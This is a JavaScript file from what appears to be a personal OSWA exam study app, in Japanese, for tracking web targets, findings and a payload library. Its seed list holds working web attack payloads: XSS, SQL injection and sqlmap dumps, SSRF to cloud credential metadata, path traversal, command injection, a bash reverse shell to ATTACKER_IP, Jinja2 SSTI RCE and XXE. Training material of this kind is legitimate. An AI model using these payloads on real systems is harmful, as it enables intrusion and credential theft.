/* ═══════════════════════════════════════════════════════
   go2 cheatsheet — web.js  (OSWA / Web アプリ攻略モード)
   Data: data.targets[], data.payloads[], data.vulnTypes[]
   target  { id,name,url,techStack[],status,category,localTxt,proofTxt,
             notes, findings[] }
   finding { id,vulnType,endpoint,request,payload,note,steps[],impact,verdict,ts }
   payload { id,title,vulnType,body,context,bypass,reference,ts }
   vulnType{ id,label,color }

   app.js の共通関数（openModal/toast/esc/uid/copyCell/copyToClipboard/val）と
   定数（DEFAULT_VULN_TYPES/WEB_STATUS/WEB_VERDICTS）を再利用。
════════════════════════════════════════════════════════ */

/* ── ヘルパ ── */
function webTarget()      { return data.targets.find(t => t.id === webTargetId); }
function webStatusMeta(s) { return WEB_STATUS[s] || WEB_STATUS.todo; }
function vtGet(id)        { return data.vulnTypes.find(v => v.id === id); }
function vtColor(id)      { const v = vtGet(id); return v ? v.color : "#7d9186"; }
function vtLabel(id)      { const v = vtGet(id); return v ? v.label : (id || "—"); }
function webHHMM(ts){
  const d = new Date(ts||Date.now());
  return `${String(d.getHours()).padStart(2,"0")}:${String(d.getMinutes()).padStart(2,"0")}`;
}

/* 共通サイドナビ */
function renderWebNav(active) {
  const nav = document.getElementById("navList");
  if (!nav) return;
  const item = (mode, icon, label, count) => `
    <button class="nav-item ${appMode===mode?'active':''}" onclick="setMode('${mode}')">
      <span class="material-symbols-rounded nav-icon">${icon}</span>
      <span class="nav-label">${label}</span>
      ${count!=null?`<span class="nav-count">${count}</span>`:""}
    </button>`;
  nav.innerHTML =
    item("web", "language", "ターゲット", data.targets.length) +
    item("payload", "vaccines", "ペイロード", data.payloads.length) +
    `<button class="nav-item" onclick="webEditVulnTypes()">
      <span class="material-symbols-rounded nav-icon">tune</span>
      <span class="nav-label">脆弱性タイプ編集</span>
    </button>`;
}

/* ═══════════════════════════════════════════════════
   ペイロード・ライブラリ
════════════════════════════════════════════════════ */
function renderPayloadLib() {
  webSeedIfEmpty();  // 初回だけOSWA定番シードを投入
  renderWebNav("payload");
  const main = document.getElementById("main");

  // タイプ別カウント
  const counts = {};
  data.vulnTypes.forEach(v => counts[v.id] = data.payloads.filter(p=>p.vulnType===v.id).length);
  const countStr = data.vulnTypes.filter(v=>counts[v.id]).map(v=>`${v.label.split(" ")[0]} ${counts[v.id]}`).join(" · ") || "まだありません";

  let list = data.payloads.slice();
  if (payloadVtFilter) list = list.filter(p => p.vulnType === payloadVtFilter);

  const vtChips = data.vulnTypes.map(v => {
    const n = counts[v.id];
    return `<button class="th-chip ${payloadVtFilter===v.id?'on':''}" onclick="pSetVt('${v.id}')" style="${payloadVtFilter===v.id?`border-color:${v.color};color:${v.color}`:''}">${esc(v.label.split(" ")[0])}${n?` <span style="opacity:.6">${n}</span>`:""}</button>`;
  }).join("");

  main.innerHTML = `
    <div class="s-head">
      <h1>ペイロード</h1>
      <span class="th-count">${data.payloads.length} 件 · ${countStr}</span>
      <button class="th-import-btn" onclick="pImportFromCheatsheet()"><span class="material-symbols-rounded">move_to_inbox</span>チートシートから取り込み</button>
      <button class="th-add" onclick="pAddPayload()"><span class="material-symbols-rounded">add</span>ペイロードを追加</button>
    </div>
    <div class="th-filters">
      <button class="th-chip ${!payloadVtFilter?'on':''}" onclick="pSetVt(null)">すべて</button>
      ${vtChips}
      <span class="th-sep"></span>
      <button class="th-chip th-chip-edit" onclick="webEditVulnTypes()"><span class="material-symbols-rounded" style="font-size:15px">tune</span>タイプを編集</button>
    </div>
    ${list.length ? `<div class="web-pgrid">${list.map(renderPayloadCard).join("")}</div>`
      : emptyState("vaccines", data.payloads.length?"該当するペイロードがありません":"ペイロードがまだありません",
          data.payloads.length?"フィルタを変えてください":"「ペイロードを追加」で登録できます")}
  `;
}

function renderPayloadCard(p) {
  const v = vtGet(p.vulnType);
  const color = v ? v.color : "#7d9186";
  const label = v ? v.label.split(" ")[0] : "—";
  const ctx = p.context ? `<span class="web-ctx-tag">${esc(p.context)}</span>` : "";
  const bypass = p.bypass ? `<div class="web-bypass"><span class="material-symbols-rounded" style="font-size:14px">warning</span>${esc(p.bypass)}</div>` : "";
  const preview = esc(p.body).split("\n").slice(0,5).join("\n");
  return `
    <div class="web-pcard" onclick="pOpen('${p.id}')" style="border-left:3px solid ${color}">
      <div class="web-pcard-top">
        <span class="web-vt" style="background:${color}22;color:${color}">${esc(label)}</span>
        <button class="th-qcopy" onclick="event.stopPropagation();copyCell(event, ${escAttr(JSON.stringify(p.body))})" title="コピー"><span class="material-symbols-rounded">content_copy</span></button>
      </div>
      <h3 class="web-ptitle">${esc(p.title)}</h3>
      <pre class="web-pcode">${preview||"<span style='color:var(--md-on-surface-var)'>（本体なし）</span>"}</pre>
      <div class="web-pcard-foot">${ctx}</div>
      ${bypass}
    </div>`;
}

function pSetVt(id){ payloadVtFilter = (payloadVtFilter===id?null:id); renderPayloadLib(); }

function pAddPayload(preset) {
  const vtOpts = data.vulnTypes.map(v=>`<option value="${v.id}" ${preset?.vulnType===v.id?'selected':''}>${esc(v.label)}</option>`).join("");
  openModal("ペイロードを追加",
    `<label>タイトル</label>
     <input id="pTitle" value="${esc(preset?.title||"")}" placeholder="例: UNION カラム数特定">
     <label>脆弱性タイプ</label>
     <select id="pVt">${vtOpts}</select>
     <label>ペイロード本体</label>
     <textarea id="pBody" placeholder="ペイロードを貼り付け">${esc(preset?.body||"")}</textarea>
     <label>用途・発動条件（任意）</label>
     <input id="pCtx" value="${esc(preset?.context||"")}" placeholder="例: 属性エスケープ後 / ?file= 系">
     <label>WAF回避メモ（任意）</label>
     <input id="pBypass" value="${esc(preset?.bypass||"")}" placeholder="例: 127.0.0.1 が弾かれる時は 2130706433">
     <label>参照リンク（任意）</label>
     <input id="pRef" value="${esc(preset?.reference||"")}" placeholder="PayloadsAllTheThings 等">`,
    () => {
      data.payloads.push({
        id: uid(),
        title: val("pTitle") || "無題のペイロード",
        vulnType: val("pVt") || (data.vulnTypes[0]?.id||""),
        body: val("pBody"),
        context: val("pCtx"), bypass: val("pBypass"), reference: val("pRef"),
        ts: Date.now(),
      });
      renderPayloadLib();
      toast("✅ ペイロードを追加しました");
    });
}

function pOpen(id) {
  const p = data.payloads.find(x=>x.id===id); if (!p) return;
  const v = vtGet(p.vulnType);
  const ref = p.reference ? `<a href="${esc(p.reference)}" target="_blank" rel="noopener" style="color:var(--md-primary)">${esc(p.reference)}</a>` : "—";
  openModal(p.title,
    `<div class="th-detail">
       <div class="th-detail-row"><span class="th-dl">タイプ</span><span class="web-vt" style="background:${(v?.color||'#7d9186')}22;color:${v?.color||'#7d9186'}">${esc(v?.label||"—")}</span></div>
       ${p.context?`<div class="th-detail-row"><span class="th-dl">用途</span><span>${esc(p.context)}</span></div>`:""}
       ${p.bypass?`<div class="th-detail-row"><span class="th-dl">WAF回避</span><span style="color:var(--md-warn)">${esc(p.bypass)}</span></div>`:""}
       <div class="th-detail-row"><span class="th-dl">参照</span><span>${ref}</span></div>
       <label style="margin-top:16px">ペイロード本体</label>
       <pre class="th-qcode-full">${esc(p.body)}</pre>
     </div>`,
    null,
    { okText: "コピー", onOk: () => { copyToClipboard(p.body); toast("📋 コピーしました"); },
      extraBtns: [
        { label: "編集", cls: "btn-text", fn: () => { closeModal(); pEditPayload(id); } },
        { label: "削除", cls: "btn-text btn-danger", fn: () => { closeModal(); pDelPayload(id); } },
      ] });
}

function pEditPayload(id) {
  const p = data.payloads.find(x=>x.id===id); if (!p) return;
  const vtOpts = data.vulnTypes.map(v=>`<option value="${v.id}" ${p.vulnType===v.id?'selected':''}>${esc(v.label)}</option>`).join("");
  openModal("ペイロードを編集",
    `<label>タイトル</label><input id="pTitle" value="${esc(p.title)}">
     <label>脆弱性タイプ</label><select id="pVt">${vtOpts}</select>
     <label>ペイロード本体</label><textarea id="pBody">${esc(p.body)}</textarea>
     <label>用途・発動条件</label><input id="pCtx" value="${esc(p.context)}">
     <label>WAF回避メモ</label><input id="pBypass" value="${esc(p.bypass)}">
     <label>参照リンク</label><input id="pRef" value="${esc(p.reference)}">`,
    () => {
      p.title=val("pTitle")||"無題のペイロード"; p.vulnType=val("pVt");
      p.body=val("pBody"); p.context=val("pCtx"); p.bypass=val("pBypass"); p.reference=val("pRef");
      renderPayloadLib(); toast("✅ 更新しました");
    });
}
function pDelPayload(id) {
  const p = data.payloads.find(x=>x.id===id); if (!p) return;
  if (!confirm(`「${p.title}」を削除しますか？`)) return;
  data.payloads = data.payloads.filter(x=>x.id!==id);
  renderPayloadLib(); toast("🗑 削除しました");
}

function renderPayloadSearch() {
  const main = document.getElementById("main");
  const q = document.getElementById("searchInput").value.trim().toLowerCase();
  if (!q) { searchMode=false; render(); return; }
  const hits = data.payloads.filter(p =>
    (p.title||"").toLowerCase().includes(q) ||
    (p.body||"").toLowerCase().includes(q) ||
    (p.context||"").toLowerCase().includes(q) ||
    vtLabel(p.vulnType).toLowerCase().includes(q));
  renderWebNav("payload");
  main.innerHTML = `
    <div class="s-head"><h1>検索: ${esc(q)}</h1><span class="th-count">${hits.length} 件</span></div>
    ${hits.length ? `<div class="web-pgrid">${hits.map(renderPayloadCard).join("")}</div>`
      : emptyState("search_off","一致するペイロードがありません","別のキーワードをお試しください")}
  `;
}

/* チートシートから取り込み（Web攻撃ペイロードがあれば） */
function pImportFromCheatsheet() {
  const existing = new Set(data.payloads.map(p => (p.body||"").trim()));
  const VT_HINT = [
    [/xss|cross.?site.?script/i, "xss"],
    [/sqli|sql.?injection/i, "sqli"],
    [/ssrf/i, "ssrf"],
    [/lfi|path.?traversal|ディレクトリトラバーサル/i, "lfi"],
    [/rce|command.?inj|コマンドインジェク/i, "rce"],
    [/ssti|template.?inj/i, "ssti"],
    [/xxe|xml.?external/i, "xxe"],
    [/idor/i, "idor"],
  ];
  const cand = [];
  for (const t of data.tabs) {
    const label = t.label || "";
    // Web攻撃に関係しそうなタブ/ブロックだけ対象
    for (const b of t.blocks || []) {
      const ctx = (label + " " + (b.label||"")).toLowerCase();
      const vtHit = VT_HINT.find(([re]) => re.test(ctx));
      if (!vtHit) continue;   // Web脆弱性タイプに紐づかないブロックは除外
      const hdr = (b.headers||[]).map(h=>String(h).toLowerCase());
      // ペイロード列 = 「payload」「ペイロード」を含む列、なければ2列目
      let pcol = hdr.findIndex(h => /payload|ペイロード|クエリ|query/.test(h));
      if (pcol < 0) pcol = hdr.length >= 2 ? 1 : 0;
      let tcol = hdr.findIndex((h,i)=> i!==pcol && /用途|項目|名前|title|手法/.test(h));
      if (tcol < 0) tcol = 0;
      for (const r of b.rows || []) {
        const body = String(r[pcol]||"").trim();
        if (body.length < 4) continue;
        if (existing.has(body)) continue;
        cand.push({
          id: uid(),
          title: String(r[tcol]||b.label||"取り込み").trim().slice(0,60),
          vulnType: vtHit[1], body,
          context: "取り込み元: " + label, bypass: "", reference: "",
          ts: Date.now(),
        });
        existing.add(body);
      }
    }
  }
  if (!cand.length) {
    openModal("チートシートから取り込み",
      `<p style="font-size:14px;line-height:1.7">チートシート内に取り込めるWeb攻撃ペイロードが見つかりませんでした。</p>
       <p style="font-size:13px;color:var(--md-on-surface-var);margin-top:10px;line-height:1.7">現状のチートシートは防御寄り（KQL等）の内容が中心です。ペイロードは「ペイロードを追加」から手動登録するか、初期シードをご利用ください。</p>`,
      null, { okText:"OK", onOk:()=>closeModal() });
    return;
  }
  const byVt = {};
  cand.forEach(c => byVt[c.vulnType] = (byVt[c.vulnType]||0)+1);
  const sum = Object.keys(byVt).map(k=>`${vtLabel(k).split(" ")[0]} ${byVt[k]}`).join(" · ");
  openModal("チートシートから取り込み",
    `<div class="th-import-sum">
       <div class="th-kv"><span class="k">取り込むペイロード</span><span class="v">${cand.length} 件</span></div>
       <div class="th-kv"><span class="k">タイプ内訳</span><span class="v">${esc(sum)}</span></div>
     </div>`,
    () => { data.payloads.push(...cand); renderPayloadLib(); toast(`✅ ${cand.length} 件を取り込みました`); },
    { okText: `${cand.length} 件を取り込む` });
}

/* ═══════════════════════════════════════════════════
   OSWA定番ペイロードのシード（初回のみ）
════════════════════════════════════════════════════ */
function webSeedIfEmpty() {
  if (data.payloads.length || window.__webSeeded) return;
  window.__webSeeded = true;
  const seed = [
    ["xss", "基本の img onerror", "<img src=x onerror=alert(document.cookie)>", "属性/タグエスケープ後の反射XSS", ""],
    ["xss", "SVG onload", "<svg onload=alert(1)>", "script がフィルタされる時", ""],
    ["xss", "属性ブレイクアウト", '"><script>alert(1)</script>', "value 属性内に反射する時", ""],
    ["sqli", "認証バイパス", "' OR '1'='1'-- -", "ログインフォーム", ""],
    ["sqli", "UNION カラム数特定", "' ORDER BY 1-- -\n' UNION SELECT NULL,NULL,NULL-- -", "エラーが消えるまで数を増やす", ""],
    ["sqli", "DB情報抽出 (MySQL)", "' UNION SELECT NULL,version(),database()-- -", "カラム数確定後", ""],
    ["sqli", "sqlmap (リクエストファイル)", "sqlmap -r request.txt --batch --dbs\nsqlmap -r request.txt -D <db> --tables --batch\nsqlmap -r request.txt -D <db> -T <tbl> --dump --batch", "Burpのリクエストを保存して -r", "手動SQLiも練習推奨"],
    ["ssrf", "クラウドメタデータ (AWS)", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "URLパラメータ", "127.0.0.1が弾かれる時は 2130706433 / [::] / 0.0.0.0"],
    ["ssrf", "内部ポートスキャン", "http://127.0.0.1:PORT/", "gopher:// が使える場合もある", ""],
    ["lfi", "PHP filter でソース抽出", "php://filter/convert.base64-encode/resource=index.php", "?file= 系で拡張子が付与される時", ""],
    ["lfi", "パストラバーサル", "../../../../etc/passwd", "深さを増やして試す", "....//  や URLエンコード %2e%2e%2f で回避"],
    ["lfi", "ログ汚染 → RCE", "/var/log/apache2/access.log", "User-Agent に PHP を仕込む", ""],
    ["rce", "コマンド連結", ";id\n|id\n$(id)\n`id`\n%0aid", "OSコマンドインジェクション", ""],
    ["rce", "リバースシェル (bash)", "bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1", "nc -lvnp 443 で待受", ""],
    ["ssti", "SSTI 検出", "${7*7}\n{{7*7}}\n<%= 7*7 %>\n#{7*7}", "49 が返ればテンプレートエンジンを絞り込む", "Template Injection Table 参照"],
    ["ssti", "Jinja2 RCE", "{{ self.__init__.__globals__.__builtins__.import('os').popen('id').read() }}", "Python/Jinja2 確定後", ""],
    ["xxe", "ファイル読み取り", '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>', "XMLを受け付けるエンドポイント", ""],
    ["idor", "ID総当り", "/api/user/1 → /api/user/2 ...", "識別子を変えてアクセス", "Burp Intruder / ffuf で自動化"],
  ];
  const vtOk = new Set(data.vulnTypes.map(v=>v.id));
  seed.forEach(([vt, title, body, ctx, bypass]) => {
    if (!vtOk.has(vt)) return;
    data.payloads.push({ id: uid(), title, vulnType: vt, body, context: ctx||"", bypass: bypass||"", reference: "", ts: Date.now() });
  });
}

/* ═══════════════════════════════════════════════════
   Webターゲット一覧
════════════════════════════════════════════════════ */
function renderWeb() {
  if (webView === "target" && webTarget()) { renderTargetDetail(); return; }
  webView = "targets";
  renderWebNav("web");
  const main = document.getElementById("main");

  const proof = data.targets.filter(t=>t.status==="proof").length;
  const probing = data.targets.filter(t=>t.status==="probing").length;

  let list = data.targets.slice();
  if (["todo","probing","exploited","proof"].includes(webFilter)) list = list.filter(t=>t.status===webFilter);
  else if (webFilter === "OSWA試験") list = list.filter(t=>t.category==="OSWA試験");
  else if (webFilter === "練習") list = list.filter(t=>t.category==="練習");

  const fchip = (key,label) => `<button class="th-chip ${webFilter===key?'on':''}" onclick="wSetFilter('${key}')">${label}</button>`;

  const cards = list.map(t => {
    const st = webStatusMeta(t.status);
    const stack = (t.techStack||[]).map(s=>`<span class="web-stack-tag">${esc(s)}</span>`).join("") || `<span class="web-stack-tag">—</span>`;
    const vts = [...new Set((t.findings||[]).map(f=>f.vulnType).filter(Boolean))];
    const vtBadges = vts.map(id=>{const c=vtColor(id);return `<span class="web-vt" style="background:${c}22;color:${c}">${esc(vtLabel(id).split(" ")[0])}</span>`;}).join("");
    const localGot = t.localTxt ? "got" : "";
    const proofGot = t.proofTxt ? "got" : "";
    return `
      <div class="web-tcard" onclick="wOpen('${t.id}')">
        <div class="web-pcard-top">
          <span class="web-tstatus ${st.cls}">${st.label}</span>
          ${t.category?`<span style="font-size:11px;color:var(--md-on-surface-var);font-family:var(--font-mono);margin-left:auto">${esc(t.category)}</span>`:""}
        </div>
        <h3 class="web-tname">${esc(t.name)}</h3>
        ${t.url?`<div class="web-turl">${esc(t.url)}</div>`:""}
        <div class="web-tstack">${stack}</div>
        ${vtBadges?`<div class="web-tvulns">${vtBadges}</div>`:""}
        <div class="web-tflags">
          <span class="web-flag ${localGot}">🚩 local.txt ${localGot?"✓":""}</span>
          <span class="web-flag ${proofGot}">🚩 proof.txt ${proofGot?"✓":""}</span>
        </div>
      </div>`;
  }).join("");

  main.innerHTML = `
    <div class="s-head">
      <h1>Webターゲット</h1>
      <span class="th-count">${data.targets.length} 件 · proof取得 ${proof} · 調査中 ${probing}</span>
      <button class="th-add" onclick="wAddTarget()"><span class="material-symbols-rounded">add</span>ターゲットを追加</button>
    </div>
    <div class="th-filters">
      ${fchip("all","すべて")}${fchip("probing","調査中")}${fchip("exploited","exploited")}${fchip("proof","proof取得")}
      <span class="th-sep"></span>${fchip("OSWA試験","OSWA試験")}${fchip("練習","練習")}
    </div>
    ${list.length ? `<div class="web-tgrid">${cards}</div>`
      : emptyState("language", data.targets.length?"該当するターゲットがありません":"ターゲットがまだありません",
          data.targets.length?"フィルタを変えてください":"「ターゲットを追加」で攻略対象を登録しましょう")}
  `;
}
function wSetFilter(key){ webFilter=key; renderWeb(); }

function wAddTarget() {
  openModal("ターゲットを追加",
    `<label>名前</label><input id="tName" placeholder="例: Target 1">
     <label>URL</label><input id="tUrl" placeholder="http://192.168.1.101/">
     <label>技術スタック（スペース区切り）</label><input id="tStack" placeholder="PHP Apache MySQL">
     <label>カテゴリ</label><select id="tCat"><option value="OSWA試験">OSWA試験</option><option value="練習">練習</option></select>`,
    () => {
      const t = {
        id: uid(), name: val("tName")||"無名ターゲット", url: val("tUrl"),
        techStack: val("tStack").split(/\s+/).filter(Boolean),
        status: "probing", category: val("tCat")||"OSWA試験",
        localTxt: "", proofTxt: "", notes: "", findings: [],
      };
      data.targets.push(t);
      wOpen(t.id);
      toast("✅ ターゲットを追加しました");
    });
}
function wOpen(id){ webTargetId=id; webView="target"; webVtFilter=null; render(); document.getElementById("main").scrollTop=0; }

/* ═══════════════════════════════════════════════════
   ターゲット詳細
════════════════════════════════════════════════════ */
function renderTargetDetail() {
  renderWebNav("web");
  const main = document.getElementById("main");
  const t = webTarget();
  if (!t) { webView="targets"; renderWeb(); return; }
  const st = webStatusMeta(t.status);

  // ワンライン入力の脆弱性タイプ選択
  const curVt = webInputVt || data.vulnTypes[0]?.id || "";
  const curVtObj = vtGet(curVt);
  const vtMenu = data.vulnTypes.map(v=>`<button class="web-vt-opt" onclick="wSetInputVt('${v.id}')" style="color:${v.color}">${esc(v.label.split(" ")[0])}</button>`).join("");

  // findings（タイプ絞り込み）
  let findings = t.findings.slice();
  if (webVtFilter) findings = findings.filter(f=>f.vulnType===webVtFilter);
  const timeline = findings.length ? findings.map(f => {
    const realIdx = t.findings.indexOf(f);
    const c = vtColor(f.vulnType);
    const req = f.request ? `<pre class="web-req">${webHighlightReq(f.request, f.payload)}<button class="web-savebtn" onclick="wSaveToPayloads(${realIdx})" title="ペイロード集に保存"><span class="material-symbols-rounded" style="font-size:14px">bookmark_add</span> ペイロード集に保存</button></pre>` : "";
    return `
      <div class="web-finding" style="border-left:3px solid ${c}">
        <div class="web-finding-head">
          <span class="web-vt" style="background:${c}22;color:${c}">${esc(vtLabel(f.vulnType).split(" ")[0])}</span>
          ${f.endpoint?`<span class="web-finding-ep">${esc(f.endpoint)}</span>`:""}
          <span class="web-finding-verdict ${esc(f.verdict)}">${esc(f.verdict)}</span>
          <button class="th-step-edit" onclick="wMoveFinding(${realIdx},-1)" title="上へ" ${realIdx===0?'disabled':''}><span class="material-symbols-rounded" style="font-size:14px">arrow_upward</span></button>
          <button class="th-step-edit" onclick="wMoveFinding(${realIdx},1)" title="下へ" ${realIdx===t.findings.length-1?'disabled':''}><span class="material-symbols-rounded" style="font-size:14px">arrow_downward</span></button>
          <button class="th-step-edit" onclick="wEditFinding(${realIdx})" title="編集"><span class="material-symbols-rounded" style="font-size:14px">edit</span></button>
          <button class="th-step-del" onclick="wDelFinding(${realIdx})" title="削除"><span class="material-symbols-rounded" style="font-size:14px">delete</span></button>
        </div>
        ${req}
        ${f.note?`<div class="web-finding-note"><span class="tag">→ </span>${esc(f.note)}</div>`:""}
      </div>`;
  }).join("") : `<div class="th-empty-tl">まだ発見がありません。下の入力欄から脆弱性を記録しましょう。</div>`;

  // 脆弱性タイプ絞り込みchips
  const vtInFindings = [...new Set(t.findings.map(f=>f.vulnType).filter(Boolean))];
  const vtFilterChips = vtInFindings.map(id=>{
    const c=vtColor(id); const n=t.findings.filter(f=>f.vulnType===id).length;
    return `<button class="th-vchip ${webVtFilter===id?'on':''}" onclick="wSetVtFilter('${id}')" style="${webVtFilter===id?`border-color:${c};color:${c}`:''}">${esc(vtLabel(id).split(" ")[0])} <span class="cnt">${n}</span></button>`;
  }).join("");

  const foundVts = vtInFindings.map(id=>{const c=vtColor(id);return `<span class="web-vt" style="background:${c}22;color:${c}">${esc(vtLabel(id).split(" ")[0])}</span>`;}).join("") || "<span style='color:var(--md-on-surface-var)'>—</span>";

  main.innerHTML = `
    <div class="web-td">
      <div class="web-td-main">
        <div class="th-crumb"><button onclick="wBackList()">Web攻略</button> / <b>${esc(t.name)}</b></div>
        <div class="web-td-title"><h1>${esc(t.name)}</h1><span class="web-tstatus ${st.cls}">${st.label}</span></div>
        ${t.url?`<div class="web-td-url">${esc(t.url)}</div>`:""}

        <div class="web-quick">
          <button class="web-vt-pick" onclick="wToggleVtMenu(event)" style="color:${curVtObj?.color||'var(--md-primary)'}">${esc(curVtObj?.label.split(" ")[0]||"タイプ")} ▾
            <div class="web-vt-menu" id="wVtMenu">${vtMenu}</div>
          </button>
          <input id="wQuickInput" placeholder="発見を記録… 例: /product?id= に UNION有効、カラム3 → admin creds 取得 [confirmed]" onkeydown="if(event.key==='Enter')wQuickAdd()">
          <button class="web-go" onclick="wQuickAdd()">記録</button>
        </div>
        <div class="web-quick-hint">先頭でタイプ選択。末尾 <b>[confirmed] [testing]</b> で確認状態。「→」の後ろが所見。生HTTPリクエストは発見をクリック→編集で貼れます。</div>

        ${vtFilterChips?`<div class="th-vchips"><button class="th-vchip ${!webVtFilter?'on':''}" onclick="wSetVtFilter(null)">すべて <span class="cnt">${t.findings.length}</span></button>${vtFilterChips}</div>`:""}

        <div class="web-findings">${timeline}</div>
      </div>
      <div class="web-td-side">
        <div class="th-side-sec"><h4>ターゲット情報</h4>
          <div class="th-kv"><span class="k">URL</span><span class="v">${esc(t.url)||"—"}</span></div>
          <div class="th-kv"><span class="k">スタック</span><span class="v">${esc((t.techStack||[]).join("/"))||"—"}</span></div>
          <div class="th-kv"><span class="k">状態</span><span class="v" style="color:${st.color}">${st.label}</span></div>
          <div class="th-kv"><span class="k">発見数</span><span class="v">${t.findings.length}</span></div>
          <button class="th-side-mini" onclick="wEditMeta()"><span class="material-symbols-rounded" style="font-size:14px">edit</span>情報を編集</button>
        </div>
        <div class="th-side-sec"><h4>フラグ (local / proof)</h4>
          <div class="web-flag-input ${t.localTxt?'got':''}"><span class="lbl">🚩 local</span><span class="val">${esc(t.localTxt)||"未取得"}</span></div>
          <div class="web-flag-input ${t.proofTxt?'got':''}"><span class="lbl">🚩 proof</span><span class="val">${esc(t.proofTxt)||"未取得"}</span></div>
          <button class="th-side-mini" onclick="wEditFlags()"><span class="material-symbols-rounded" style="font-size:14px">flag</span>フラグを入力</button>
        </div>
        <div class="th-side-sec"><h4>発見した脆弱性</h4><div class="web-tvulns">${foundVts}</div></div>
        <div class="th-side-sec"><h4>状態</h4>
          <button class="th-side-mini" onclick="wChangeStatus()"><span class="material-symbols-rounded" style="font-size:14px">sync</span>状態を変更</button>
        </div>
        <div class="th-side-sec"><h4>出力</h4>
          <button class="web-report-btn" onclick="wOpenReport()"><span class="material-symbols-rounded" style="font-size:16px">description</span>OSWAレポートを作成</button>
        </div>
      </div>
    </div>
  `;
}

/* 生HTTPリクエストのペイロード部分をハイライト */
function webHighlightReq(req, payload) {
  let html = esc(req);
  // メソッド行を強調
  html = html.replace(/^(GET|POST|PUT|DELETE|PATCH|HEAD)\b/m, '<span class="web-method">$1</span>');
  // ペイロード文字列を赤ハイライト
  if (payload && payload.trim()) {
    const pe = esc(payload.trim());
    html = html.split(pe).join(`<span class="web-payload-hl">${pe}</span>`);
  }
  return html;
}

function wBackList(){ webView="targets"; webTargetId=null; renderWeb(); }
function wSetVtFilter(id){ webVtFilter=id; renderTargetDetail(); }
function wSetInputVt(id){ webInputVt=id; document.getElementById("wVtMenu")?.classList.remove("open"); renderTargetDetail(); }
function wToggleVtMenu(e){ e.stopPropagation(); document.getElementById("wVtMenu")?.classList.toggle("open"); }

/* ワンライン入力 → finding記録 */
function wQuickAdd() {
  const input = document.getElementById("wQuickInput");
  if (!input) return;
  const raw = input.value.trim();
  if (!raw) return;
  const t = webTarget(); if (!t) return;

  let verdict = "testing", text = raw;
  const m = raw.match(/^(.*?)\s*\[([^\]]+)\]\s*$/);
  if (m) {
    const found = WEB_VERDICTS.find(v => v.id.toLowerCase() === m[2].toLowerCase());
    if (found) { verdict = found.id; text = m[1]; }
  }
  // 「→」で エンドポイント/所見 分割
  let endpoint = text, note = "";
  const arrow = text.split(/\s*(?:→|->)\s*/);
  if (arrow.length >= 2) { endpoint = arrow[0]; note = arrow.slice(1).join(" → "); }

  t.findings.push({
    id: uid(), vulnType: webInputVt || data.vulnTypes[0]?.id || "",
    endpoint: endpoint.trim(), request: "", payload: "",
    note: note.trim(), steps: [], impact: "", verdict, ts: Date.now(),
  });
  input.value = "";
  renderTargetDetail();
}

function wEditFinding(idx) {
  const t = webTarget(); const f = t.findings[idx]; if (!f) return;
  const vtOpts = data.vulnTypes.map(v=>`<option value="${v.id}" ${f.vulnType===v.id?'selected':''}>${esc(v.label)}</option>`).join("");
  const vOpts = WEB_VERDICTS.map(v=>`<option value="${v.id}" ${f.verdict===v.id?'selected':''}>${v.label}</option>`).join("");
  openModal("発見を編集",
    `<label>脆弱性タイプ</label><select id="fVt">${vtOpts}</select>
     <label>エンドポイント</label><input id="fEp" value="${esc(f.endpoint)}" placeholder="/product.php?id=">
     <label>生HTTPリクエスト（Burpからコピペ）</label><textarea id="fReq" placeholder="GET /product.php?id=1' UNION SELECT... HTTP/1.1&#10;Host: ...">${esc(f.request)}</textarea>
     <label>ペイロード（赤ハイライト対象）</label><input id="fPayload" value="${esc(f.payload)}" placeholder="' UNION SELECT NULL,username,password FROM users-- -">
     <label>所見</label><textarea id="fNote">${esc(f.note)}</textarea>
     <label>再現手順（1行1ステップ）</label><textarea id="fSteps" placeholder="ORDER BY でカラム数(3)を特定&#10;UNION SELECT で users を抽出">${esc((f.steps||[]).join("\n"))}</textarea>
     <label>Impact（影響）</label><input id="fImpact" value="${esc(f.impact)}" placeholder="全ユーザーの認証情報が漏洩">
     <label>確認状態</label><select id="fVerdict">${vOpts}</select>`,
    () => {
      f.vulnType=val("fVt"); f.endpoint=val("fEp"); f.request=val("fReq");
      f.payload=val("fPayload"); f.note=val("fNote");
      f.steps=val("fSteps").split("\n").map(s=>s.trim()).filter(Boolean);
      f.impact=val("fImpact"); f.verdict=val("fVerdict");
      renderTargetDetail(); toast("✅ 更新しました");
    });
}
function wDelFinding(idx) {
  const t = webTarget(); if (!t.findings[idx]) return;
  if (!confirm("この発見を削除しますか？")) return;
  t.findings.splice(idx,1); renderTargetDetail();
}

/* findingの並び替え */
function wMoveFinding(idx, dir) {
  const t = webTarget(); if (!t) return;
  idx = Number(idx);
  const j = idx + dir;
  if (j < 0 || j >= t.findings.length) return;
  [t.findings[idx], t.findings[j]] = [t.findings[j], t.findings[idx]];
  renderTargetDetail();
}

/* 発見のペイロードをライブラリに保存 */
function wSaveToPayloads(idx) {
  const t = webTarget(); const f = t.findings[idx]; if (!f) return;
  const body = f.payload || f.request;
  if (!body) { toast("保存するペイロードがありません"); return; }
  pAddPayload({
    title: f.endpoint ? `${vtLabel(f.vulnType).split(" ")[0]} @ ${f.endpoint}` : vtLabel(f.vulnType),
    vulnType: f.vulnType, body, context: `取り込み元: ${t.name}`,
  });
}

function wEditMeta() {
  const t = webTarget(); if (!t) return;
  openModal("ターゲット情報を編集",
    `<label>名前</label><input id="tName" value="${esc(t.name)}">
     <label>URL</label><input id="tUrl" value="${esc(t.url)}">
     <label>技術スタック（スペース区切り）</label><input id="tStack" value="${esc((t.techStack||[]).join(" "))}">
     <label>カテゴリ</label><select id="tCat"><option value="OSWA試験" ${t.category==="OSWA試験"?"selected":""}>OSWA試験</option><option value="練習" ${t.category==="練習"?"selected":""}>練習</option></select>
     <label>メモ</label><textarea id="tNotes">${esc(t.notes)}</textarea>`,
    () => {
      t.name=val("tName")||"無名ターゲット"; t.url=val("tUrl");
      t.techStack=val("tStack").split(/\s+/).filter(Boolean);
      t.category=val("tCat"); t.notes=val("tNotes");
      renderTargetDetail();
    });
}
function wEditFlags() {
  const t = webTarget(); if (!t) return;
  openModal("フラグを入力",
    `<label>local.txt</label><input id="tLocal" value="${esc(t.localTxt)}" placeholder="管理画面で確認できる値">
     <label>proof.txt</label><input id="tProof" value="${esc(t.proofTxt)}" placeholder="/ または C:\\ の proof.txt">
